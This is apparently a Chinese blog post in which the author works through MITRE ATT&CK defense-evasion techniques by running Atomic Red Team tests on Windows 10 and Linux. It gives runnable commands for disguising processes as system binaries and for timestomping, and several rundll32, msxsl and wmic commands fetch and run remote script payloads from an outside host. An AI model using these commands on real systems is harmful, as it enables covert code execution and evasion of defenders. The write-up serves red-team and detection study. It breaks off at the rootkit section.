---
layout: post
title: 跟着ATT&CK学安全之defense-evasion
excerpt: "跟着ATT&CK学安全之defense-evasion"
categories: [ATT&CK]
comments: true
---
#### T1009 - Binary Padding
通过向binary末尾来绕过基于hash的黑名单校验,同时较大的文件也可以绕过一些安全产品的检测

测试平台:macOS, Linux,其中count代表填充多少个字节
```bash
dd if=/dev/zero bs=1 count=10 >> filename
```
#### T1090 - Connection Proxy
不直接连接受害者的电脑而是使用代理,现成的工具包括[HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap.
##### 测试1 Connection Proxy
平台:macOS, Linux

让该终端走某个代理
```
export http_proxy=http://127.0.0.1:7777
```
清除
```
unset http_proxy
```
##### 测试2 portproxy reg key
平台:windows

在终端修改注册表键`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4`

这个未完待续
#### T1143 - Hidden Window
通过在powershel中添加"-WindowStyle Hidden"参数来隐藏窗口
```bash
Start-Process notepad.exe -WindowStyle Hidden
```



### T1036 - Masquerading
Masquerading是为了逃避蓝队的查找,而进行的伪装.其中的一种方法是可执行文件放在一个通常受信任的目录中，或者给它一个合法的名字.或者文件名是一个和受信任文件相似的文件名.其中一个情况就是当common system utility被移动和修改名字,来避免被检测.这可以绕过基于文件名的检测,以及蓝队的眼睛:-).

还有一种是right-to-left覆盖(RTLO or RLO) ,它可以让文件名反过来,迷惑蓝队成员

红队还可以修改二进制文件的图标,产品描述等来迷惑蓝队成员

对于windows还有一种技术:对合法的工具集进行重命名,例如rundll32.exe,一个案例就是当合法的工具集移动到不同的目录中并且重命名来避免检查.其中一个滥用的受信任地址为`C:\Windows\System32`,有害的程序可以伪装成`"explorer.exe"和"svchost.exe"`来绕过检查.

对于linux系统,有一种技术就是在程序运行之后,修改它的名称和路径,防止检测,一个被滥用的新人地址就是`/bin`名称可以改为"rsyncd"和"dbus-inotifier"
###### 测试1 Masquerading as Windows LSASS process
复制cmd.exe并重命名,把它伪装成了lsass.exe
```bash
cmd.exe /c copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
cmd.exe /c %SystemRoot%\Temp\lsass.exe
```
清除
```
del /Q /F %SystemRoot%\Temp\lsass.exe
```
win10成功复现
###### 测试2 Masquerading as Linux crond process.
复制sh,重命名crond,然后运行它达到伪装的目的
```bash
cp /bin/sh /tmp/crond
/tmp/crond
```
成功复现
###### 测试3 Masquerading - cscript.exe running as notepad.exe
把cscript.exe伪装成notepad.exe
```bash
copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y
cmd.exe /c %APPDATA%\notepad.exe /B
```
清除
```
del /Q /F %APPDATA%\notepad.exe
```
win10成功复现
###### 测试4 Masquerading - wscript.exe running as svchost.exe
```bash
copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
cmd.exe /c %APPDATA%\svchost.exe /B
```
win10成功复现
###### 测试5 Masquerading - powershell.exe running as taskhostw.exe
```bash
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
cmd.exe /K %APPDATA%\taskhostw.exe
```
win10成功复现
###### 测试6 Masquerading - non-windows exe running as windows exe
```
copy #{inputfile} #{outputfile}
$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
Stop-Process -ID $myT1036
```
win10成功复现
###### 测试7 Masquerading - windows exe running as different windows exe
```bash
copy #{inputfile} #{outputfile}
$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
Stop-Process -ID $myT1036
```
win10成功复现
###### 测试8 Malicious process Masquerading as LSM.exe
```bash
copy C:\Windows\System32\cmd.exe D:\lsm.exe
D:\lsm.exe /c echo T1036 > D:\T1036.txt
```
win10成功复现
### T1099 - Timestomp
Timestomping是一种修改文件时间(创建时间,修改时间)的技术,通常来将恶意文件和本文件夹其他的文件弄成相同的时间.
###### 测试1 Set a file's access timestamp
```bash
touch -a -t 197001010000.00 #{target_filename}
```
查看
```bash
stat aa.txt 
  File: ‘aa.txt’
  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file
Device: fd01h/64769d	Inode: 398717      Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 1970-01-01 00:00:00.000000000 +0800
Modify: 2020-01-20 16:20:47.700567652 +0800
Change: 2020-01-20 16:20:47.700567652 +0800

```
成功复现
###### 测试2 Set a file's modification timestamp
```bash
touch -m -t 197001010000.00 #{target_filename}
```
成功复现
###### 测试3 Set a file's creation timestamp
先修改系统时间,然后创建文件,然后再把系统时间修改过来
```
date -s "1990-01-01 00:00:00"
touch #{target_filename}
date -s "$NOW"
```
成功复现
###### 测试4 Modify file timestamps using reference file
```bash
touch -acmr #{reference_file_path} {target_file_path}
```
成功复现
###### 测试5 Windows - Modify file creation timestamp with PowerShell
还差3个windows的没弄
### T1127 - Trusted Developer Utilities
有许多工具集可以用来执行代码,它有合法的证书并且允许它运行其他程序,这类工具集包括:MSBuild DNX RCSI WinDbg/CDB Tracker等
###### 测试1 MSBuild Bypass Using Inline Tasks
使用msbuild.exe执行c#代码
```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe D:\pycharmproject\atomic-red-team-master\atomics\T1127\src\T1127.csproj
```
windows10上运行成功
### T1220 - XSL Script Processing
Extensible Stylesheet Language (XSL)是用来描述和渲染XML文件的.为了进行复杂的操作,XSL增加了不同的语言.红队可以使用它来运行二进制代码绕过白名单的检查.和Trusted Developer Utilities相似,msxsl.exe可以在本地或者远程运行JavaScript,虽然msxsl.exe不是默认安装了,但是红队可以打包它并放在客户端.msxsl.exe运行时接收两个参数,XML源文件和XSL stylesheet.既然xsl文件也是一个xml,红队可以使用xsl文件两次,当msxsl.exe运行的时候,红队可以给xml/xsl文件任意的扩展名

命令行的例子如下:

- msxsl.exe customers[.]xml script[.]xsl
- msxsl.exe script[.]xsl script[.]xsl
- msxsl.exe script[.]jpeg script[.]jpeg

另一种技术叫做Squiblytwo,它使用windows管理工具调用JScript或VBScript在xsl文件中,这个技术也可以执行远程或本地的script.和Regsvr32一样,Squiblydoo也是一个windows信任的工具

命令行的例子如下:

- Local File: wmic process list /FORMAT:evil[.]xsl
- Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”
###### 测试1 MSXSL Bypass using local files
首先需要下载工具https://www.microsoft.com/en-us/download/details.aspx?id=21714
```
C:\Windows\Temp\msxsl.exe msxslxmlfile.xml msxslscript.xsl
```
win10成功复现(关闭病毒防护)
###### 测试2 
```
msxsl.exe http://snappyzz.com/msxslxmlfile.xml http://snappyzz.com/msxslscript.xsl
```
win10成功复现(关闭病毒防护)

剩下两个没有复现成功

### T1064 - Scripting
这个太简单了,略过
### T1085 - Rundll32
rundll32.exe可以用来调用二进制文件.红队可以利用这个特点调用恶意软件来绕过系统防护,rundll32.exe也可以运行.cpl文件,双击.cpl文件也可以造成rundll32.exe的运行.

Rundll32 也可以运行JavaScript,语法类似如下
```
rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"
```
###### 测试1 Rundll32 execute JavaScript Remote Payload With GetObject
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://snappyzz.com/T1085.sct").Exec();
```
win10成功复现
###### 测试2 Rundll32 execute VBscript command
```
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
```
win10成功复现
###### 测试3 Rundll32 advpack.dll Execution
```
rundll32.exe advpack.dll,LaunchINFSection D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
```
win10成功复现
###### 测试4 Rundll32 ieadvpack.dll Execution
```
rundll32.exe ieadvpack.dll,LaunchINFSection D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
```
**没有复现成功**
###### 测试5 Rundll32 syssetup.dll Execution
```
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085_DefaultInstall.inf
```
win10成功复现
###### 测试6 Rundll32 setupapi.dll Execution
```
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085_DefaultInstall.inf
```
**没有复现成功**
### T1014 - Rootkit
rootkits是一个隐藏病毒的程序,